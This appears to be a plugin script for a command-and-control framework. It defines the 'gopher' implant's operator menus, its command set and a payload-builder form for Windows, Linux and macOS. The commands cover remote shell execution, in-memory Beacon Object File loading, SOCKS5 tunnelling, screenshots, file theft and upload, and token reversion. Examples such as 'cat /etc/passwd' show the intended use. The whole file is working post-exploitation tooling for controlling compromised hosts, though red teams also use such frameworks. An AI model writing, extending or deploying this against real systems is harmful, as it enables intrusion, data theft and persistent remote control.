/// Gopher agent

let exit_action = menu.create_action("Exit", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "exit")) });
menu.add_session_agent(exit_action, ["gopher"])

let file_browser_action     = menu.create_action("File Browser",    function(agents_id) { agents_id.forEach(id => ax.open_browser_files(id)) });
let process_browser_action  = menu.create_action("Process Browser", function(agents_id) { agents_id.forEach(id => ax.open_browser_process(id)) });
let terminal_browser_action = menu.create_action("Remote Terminal", function(agents_id) { agents_id.forEach(id => ax.open_remote_terminal(id)) });
menu.add_session_browser(file_browser_action, ["gopher"])
menu.add_session_browser(process_browser_action, ["gopher"])
menu.add_session_browser(terminal_browser_action, ["gopher"])

let tunnel_access_action = menu.create_action("Create Tunnel", function(agents_id) { ax.open_access_tunnel(agents_id[0], true, true, false, false) });
menu.add_session_access(tunnel_access_action, ["gopher"]);


let execute_action = menu.create_action("Execute", function(files_list) {
    file = files_list[0];
    if(file.type != "file"){ return; }

    let label_bin = form.create_label("Binary:");
    let text_bin = form.create_textline(file.path + file.name);
    text_bin.setEnabled(false);
    let label_args = form.create_label("Arguments:");
    let text_args = form.create_textline();

    let layout = form.create_gridlayout();
    layout.addWidget(label_bin, 0, 0, 1, 1);
    layout.addWidget(text_bin, 0, 1, 1, 1);
    layout.addWidget(label_args, 1, 0, 1, 1);
    layout.addWidget(text_args, 1, 1, 1, 1);

    let dialog = form.create_dialog("Execute binary");
    dialog.setSize(500, 80);
    dialog.setLayout(layout);
    if ( dialog.exec() == true )
    {
        let command = "run " + text_bin.text() + " " + text_args.text();
        ax.execute_command(file.agent_id, command);
    }
});
let download_action = menu.create_action("Download", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "download " + file.path + file.name) ) });
let remove_action = menu.create_action("Remove", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "rm " + file.path + file.name) ) });
menu.add_filebrowser(download_action, ["gopher"])
menu.add_filebrowser(remove_action, ["gopher"])


let job_stop_action = menu.create_action("Stop job", function(tasks_list) {
    tasks_list.forEach((task) => {
        if(task.type == "JOB" && task.state == "Running") {
            ax.execute_command(task.agent_id, "job kill " + task.task_id);
        }
    });
});
menu.add_tasks_job(job_stop_action, ["gopher"])



let cancel_action = menu.create_action("Cancel", function(files_list) { files_list.forEach( file => ax.execute_command(file.agent_id, "job kill " + file.file_id) ) });
menu.add_downloads_running(cancel_action, ["gopher"])



var event_files_action = function(id, path) {
    ax.execute_browser(id, "ls " + path);
}
event.on_filebrowser_list(event_files_action, ["gopher"]);

var event_upload_action = function(id, path, filepath) {
    let filename = ax.file_basename(filepath);
    ax.execute_browser(id, "upload " + filepath + " " + path + filename);
}
event.on_filebrowser_upload(event_upload_action, ["gopher"]);

var event_process_action = function(id) {
    ax.execute_browser(id, "ps");
}
event.on_processbrowser_list(event_process_action, ["gopher"]);



function RegisterCommands(listenerType)
{
    let cmd_cat_win = ax.create_command("cat", "Read a file (less 10 КB)", "cat C:\\file.exe", "Task: read file");
    cmd_cat_win.addArgString("path", true);
    let cmd_cat_unix = ax.create_command("cat", "Read a file (less 10 КB)", "cat /etc/passwd", "Task: read file");
    cmd_cat_unix.addArgString("path", true);

    let cmd_cp = ax.create_command("cp", "Copy file or directory", "cp src.txt dst.txt", "Task: copy file or directory");
    cmd_cp.addArgString("src", true);
    cmd_cp.addArgString("dst", true);

    let cmd_cd_win = ax.create_command("cd", "Change current working directory", "cd C:\\Windows", "Task: change working directory");
    cmd_cd_win.addArgString("path", true);
    let cmd_cd_unix = ax.create_command("cd", "Change current working directory", "cd /home/user", "Task: change working directory");
    cmd_cd_unix.addArgString("path", true);

    let cmd_download_win = ax.create_command("download", "Download a file", "download C:\\Temp\\file.txt", "Task: download file");
    cmd_download_win.addArgString("path", true);
    let cmd_download_unix = ax.create_command("download", "Download a file", "download /tmp/file", "Task: download file");
    cmd_download_unix.addArgString("path", true);

    let _cmd_execute_bof = ax.create_command("bof", "Execute Beacon Object File", "execute bof /home/user/whoami.o", "Task: execute BOF");
    _cmd_execute_bof.addArgFile("bof", true, "Path to object file");
    _cmd_execute_bof.addArgString("param_data", false);
    let cmd_execute = ax.create_command("execute", "Execute [bof] in the current process's memory");
    cmd_execute.addSubCommands([_cmd_execute_bof])

    let cmd_exit = ax.create_command("exit", "Kill agent", "exit", "Task: kill agent");

    let _cmd_job_list = ax.create_command("list", "List of jobs", "job list", "Task: show jobs");
    let _cmd_job_kill = ax.create_command("kill", "Kill a specified job", "job kill 1a2b3c4d", "Task: kill job");
    _cmd_job_kill.addArgString("task_id", true);
    let cmd_job = ax.create_command("job", "Long-running tasks manager");
    cmd_job.addSubCommands([_cmd_job_list, _cmd_job_kill]);

    let cmd_kill = ax.create_command("kill", "Kill a process with a given PID", "kill 7865", "Task: kill process");
    cmd_kill.addArgInt("pid", true);

    let cmd_ls_win = ax.create_command("ls", "List contents of a directory or details of a file", "ls C:\\Windows", "Task: list files");
    cmd_ls_win.addArgString("path", "", ".");
    let cmd_ls_unix = ax.create_command("ls", "List contents of a directory or details of a file", "ls /home/", "Task: list files");
    cmd_ls_unix.addArgString("path", "", ".");

    let cmd_mv = ax.create_command("mv", "Move file or directory", "mv src.txt dst.txt", "Task: move file or directory");
    cmd_mv.addArgString("src", true);
    cmd_mv.addArgString("dst", true);

    let cmd_mkdir_win = ax.create_command("mkdir", "Make a directory", "mkdir C:\\Temp", "Task: make directory");
    cmd_mkdir_win.addArgString("path", true);
    let cmd_mkdir_unix = ax.create_command("mkdir", "Make a directory", "mkdir /tmp/ex", "Task: make directory");
    cmd_mkdir_unix.addArgString("path", true);

    let cmd_ps = ax.create_command("ps", "Show process list", "ps", "Task: show process list");

    let cmd_pwd = ax.create_command("pwd", "Print current working directory", "pwd", "Task: print working directory");

    let cmd_rev2self = ax.create_command("rev2self", "Revert to your original access token", "rev2self", "Task: revert token");

    let cmd_rm_win = ax.create_command("rm", "Remove a file or folder", "rm C:\\Temp\\file.txt", "Task: remove file or directory");
    cmd_rm_win.addArgString("path", true);
    let cmd_rm_unix = ax.create_command("rm", "Remove a file or folder", "rm /tmp/file", "Task: remove file or directory");
    cmd_rm_unix.addArgString("path", true);

    let cmd_run_win = ax.create_command("run", "Execute long command or scripts", "run C:\\Windows\\cmd.exe /c \\\"whoami /all\\\"", "Task: command run");
    cmd_run_win.addArgString("program", true);
    cmd_run_win.addArgString("args", false);
    let cmd_run_unix = ax.create_command("run", "Execute long command or scripts", "run /tmp/script.sh", "Task: command run");
    cmd_run_unix.addArgString("program", true);
    cmd_run_unix.addArgString("args", false);

    let cmd_screenshot = ax.create_command("screenshot", "Take a single screenshot", "screenshot", "Task: screenshot");

    let _cmd_socks_start = ax.create_command("start", "Start a SOCKS5 proxy server and listen on a specified port", "socks start 1080 -a user pass");
    _cmd_socks_start.addArgFlagString("-h", "address", "Listening interface address", "0.0.0.0");
    _cmd_socks_start.addArgInt("port", true, "Listen port");
    _cmd_socks_start.addArgBool("-a", "Enable User/Password authentication for SOCKS5");
    _cmd_socks_start.addArgString("username", false, "Username for SOCKS5 proxy");
    _cmd_socks_start.addArgString("password", false, "Password for SOCKS5 proxy");
    let _cmd_socks_stop = ax.create_command("stop", "Stop a SOCKS proxy server", "socks stop 1080");
    _cmd_socks_stop.addArgInt("port", true);
    let cmd_socks = ax.create_command("socks", "Managing socks tunnels");
    cmd_socks.addSubCommands([_cmd_socks_start, _cmd_socks_stop]);

    let cmd_shell_win = ax.create_command("shell", "Execute command via cmd.exe", "shell whoami /all", "Task: command execute");
    cmd_shell_win.addArgString("cmd", true);
    let cmd_shell_unix = ax.create_command("shell", "Execute command via /bin/sh", "shell id", "Task: command execute");
    cmd_shell_unix.addArgString("cmd", true);

    let cmd_upload_win = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt C:\\Temp\\file.txt", "Task: upload file");
    cmd_upload_win.addArgFile("local_file", true);
    cmd_upload_win.addArgString("remote_path", false);
    let cmd_upload_unix = ax.create_command("upload", "Upload a file", "upload /tmp/file.txt /root/file.txt", "Task: upload file");
    cmd_upload_unix.addArgFile("local_file", true);
    cmd_upload_unix.addArgString("remote_path", false);

    let cmd_zip_win = ax.create_command("zip", "Archive (zip) a file or directory", "zip C:\\backup C:\\Temp\\qwe.zip", "Task: Zip a file or directory");
    cmd_zip_win.addArgString("path", true);
    cmd_zip_win.addArgString("zip_path", true);
    let cmd_zip_unix = ax.create_command("zip", "Archive (zip) a file or directory", "zip /home/test /tmp/qwe.zip", "Task: Zip a file or directory");
    cmd_zip_unix.addArgString("path", true);
    cmd_zip_unix.addArgString("zip_path", true);

    let commands_win  = ax.create_commands_group("gopher", [cmd_cat_win,  cmd_cp, cmd_cd_win,  cmd_download_win,  cmd_execute, cmd_exit, cmd_job, cmd_kill, cmd_ls_win,  cmd_mv, cmd_mkdir_win,  cmd_ps, cmd_pwd, cmd_rev2self, cmd_rm_win,  cmd_run_win,  cmd_screenshot, cmd_socks, cmd_shell_win,  cmd_upload_win,  cmd_zip_win] );
    let commands_unix = ax.create_commands_group("gopher", [cmd_cat_unix, cmd_cp, cmd_cd_unix, cmd_download_unix,              cmd_exit, cmd_job, cmd_kill, cmd_ls_unix, cmd_mv, cmd_mkdir_unix, cmd_ps, cmd_pwd,               cmd_rm_unix, cmd_run_unix, cmd_screenshot, cmd_socks, cmd_shell_unix, cmd_upload_unix, cmd_zip_unix] );

    return {
        commands_windows: commands_win,
        commands_linux: commands_unix,
        commands_macos: commands_unix
    }
}

function GenerateUI(listeners_type)
{
    let labelOS = form.create_label("OS:");
    let comboOS = form.create_combo()
    comboOS.addItems(["windows", "linux", "macos"]);

    let labelArch = form.create_label("Arch:");
    let comboArch = form.create_combo()
    comboArch.addItems(["amd64", "arm64"]);

    let labelFormat = form.create_label("Format:");
    let comboFormat = form.create_combo()
    comboFormat.addItems(["Binary EXE"]);

    let checkWin7 = form.create_check("Windows 7 support");

    let hline = form.create_hline()

    let labelReconnTimeout = form.create_label("Reconnect timeout:");
    let textReconnTimeout = form.create_textline("10");
    textReconnTimeout.setPlaceholder("seconds")

    let labelReconnCount = form.create_label("Reconnect count:");
    let spinReconnCount = form.create_spin();
    spinReconnCount.setRange(0, 1000000000);
    spinReconnCount.setValue(1000000000);

    let layout = form.create_gridlayout();
    layout.addWidget(labelOS, 0, 0, 1, 1);
    layout.addWidget(comboOS, 0, 1, 1, 1);
    layout.addWidget(labelArch, 1, 0, 1, 1);
    layout.addWidget(comboArch, 1, 1, 1, 1);
    layout.addWidget(labelFormat, 2, 0, 1, 1);
    layout.addWidget(comboFormat, 2, 1, 1, 1);
    layout.addWidget(checkWin7, 3, 1, 1, 1);
    layout.addWidget(hline, 4, 0, 1, 2);
    layout.addWidget(labelReconnTimeout, 5, 0, 1, 1);
    layout.addWidget(textReconnTimeout, 5, 1, 1, 1);
    layout.addWidget(labelReconnCount, 6, 0, 1, 1);
    layout.addWidget(spinReconnCount, 6, 1, 1, 1);

    form.connect(comboOS, "currentTextChanged", function(text) {
        if(text == "windows") {
            comboFormat.setItems(["Binary EXE"]);
            checkWin7.setVisible(true);
        }
        else if (text == "linux") {
            comboFormat.setItems(["Binary .ELF"]);
            checkWin7.setVisible(false);
        }
        else {
            comboFormat.setItems(["Binary Mach-O"]);
            checkWin7.setVisible(false);
        }
    });

    let container = form.create_container()
    container.put("os", comboOS)
    container.put("arch", comboArch)
    container.put("format", comboFormat)
    container.put("reconn_timeout", textReconnTimeout)
    container.put("reconn_count", spinReconnCount)
    container.put("win7_support", checkWin7)

    let panel = form.create_panel()
    panel.setLayout(layout)

    return {
        ui_panel: panel,
        ui_container: container,
        ui_height: 450,
        ui_width: 550
    }
}